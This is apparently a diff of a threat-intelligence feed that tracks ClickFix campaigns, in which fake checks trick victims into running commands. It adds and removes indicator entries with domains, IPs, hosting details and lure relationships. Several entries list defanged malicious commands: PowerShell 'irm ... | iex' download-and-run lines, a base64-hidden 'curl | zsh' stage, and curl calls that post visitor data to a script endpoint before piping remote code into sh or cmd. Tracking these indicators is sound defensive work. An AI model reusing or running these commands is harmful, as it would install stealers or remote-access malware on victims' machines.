@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5627,
+ "count": 5625,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -2011,61 +2011,6 @@
    "lure_from": [
     "browse-cloud.codes"
    ]
-  },
-  {
-   "indicator": "168-avth.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-25",
-   "last_seen": "2026-10-26",
-   "last_online": "2026-11-17",
-   "offline_since": null,
-   "url": "https://168-avth.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "104.21.32.69",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "104.21.32.69",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-26",
-     "last_seen": "2026-10-26"
-    },
-    {
-     "ip": "172.67.184.67",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-25"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "168-avth.com",
-     "status": "online",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-26"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/b77d-[id] | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/90b-8cc3-[id] | IEX"
-   ],
-   "connects_to": [],
-   "lure_from": []
   },
   {
    "indicator": "168.119.240.217",
@@ -54247,11 +54192,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "github.pw",
     "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com",
@@ -76578,11 +76524,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "github.pw",
     "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com",
@@ -86894,11 +86841,12 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex",
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
+    "github.pw",
     "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com",
@@ -164709,8 +164657,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=e7f5fbbe-a21a-4d23-b6c6-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Flp.labrondon.com.br%2F&os=Mac%2015&lastVisitAt=2026-11-11T19%3A57%3A09.396Z&lastShellAt=2026-11-11T19%3A57%3A09.396Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=57033b58-bb96-49cb-b636-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Flp.labrondon.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-11T19%3A51%3A56.159Z\"\" -d \"\"lastShellAt=2026-11-11T19%3A51%3A56.159Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=ffc637e0-a1cd-45eb-b212-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Flp.labrondon.com.br%2F&os=Mac%2015&lastVisitAt=2026-11-17T10%3A41%3A49.369Z&lastShellAt=2026-11-17T10%3A41%3A49.369Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=76657f3b-4d76-44b6-beaa-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Flp.labrondon.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-17T10%3A38%3A22.686Z\"\" -d \"\"lastShellAt=2026-11-17T10%3A38%3A22.686Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -fsSL hxxps[:]//script-six-tawny[.]vercel[.]app/win | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -164718,6 +164666,7 @@
    "lure_from": [
     "codes.browse-cdn.beer",
     "browse-nnccodes.beer",
+    "browse-cloud.codes",
     "ncheck-brows.beer"
    ]
   },
@@ -165190,13 +165139,14 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//nexguard[.]pro/danteproliv1/[id]')|iex"
+    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
+    "github.pw",
     "nexguard.pro",
     "t-trustresnew.com",
     "groverudder12.com"
@@ -194917,14 +194867,15 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//nexguard[.]pro/danteproliv1/[id]')|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "nexguard.pro",
     "xorados.com",
     "trek-72.com",
+    "nexguard.pro",
     "lepafonso.bz",
+    "github.pw",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -245563,52 +245514,6 @@
    ]
   },
   {
-   "indicator": "simpsid.org",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-25",
-   "last_seen": "2026-10-25",
-   "last_online": "2026-11-17",
-   "offline_since": null,
-   "url": "https://simpsid.org/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "172.67.211.247",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "172.67.211.247",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-25"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "simpsid.org",
-     "status": "online",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-25"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
-   ],
-   "connects_to": [],
-   "lure_from": []
-  },
-  {
    "indicator": "sinbet.jp.net",
    "type": "domain",
    "category": "clickfix",
@@ -265995,7 +265900,8 @@
     "ncheck-brows.beer"
    ],
    "lure_from": [
-    "browse-nnccodes.beer"
+    "browse-nnccodes.beer",
+    "browse-cloud.codes"
    ]
   },
   {
@@ -271484,11 +271390,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "github.pw",
     "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
@@ -271664,9 +271571,9 @@
    "lure_from": [
     "codes.caffe-img.com",
     "browse-nnccodes.beer",
+    "browse-cloud.codes",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
+    "jjjducodes.beer"
    ]
   },
   {
@@ -272772,11 +272679,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "github.pw",
     "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
@@ -273631,11 +273539,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "github.pw",
     "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
@@ -274807,7 +274716,8 @@
     "interseq.at",
     "jscdncloude.beer",
     "codes.caffe-img.com",
-    "browse-nnccodes.beer"
+    "browse-nnccodes.beer",
+    "browse-cloud.codes"
    ]
   },
   {
@@ -275331,11 +275241,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "github.pw",
     "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
@@ -276653,6 +276564,7 @@
    "actor_link": null,
    "commands": [
     "irm 'codes[.]browse-cdn[.]beer/[id]'|iex",
+    "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-[id]/-/raw/main/01a1e287-8de7-700c-802a-[id] | IEX",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
@@ -276660,7 +276572,8 @@
     "ncheck-brows.beer"
    ],
    "lure_from": [
-    "browse-nnccodes.beer"
+    "browse-nnccodes.beer",
+    "browse-cloud.codes"
    ]
   },
   {
@@ -280898,6 +280811,7 @@
     "xorados.com",
     "trek-72.com",
     "nexguard.pro",
+    "github.pw",
     "t-trustresnew.com",
     "lepafonso.bz",
     "trustchecknes.com",
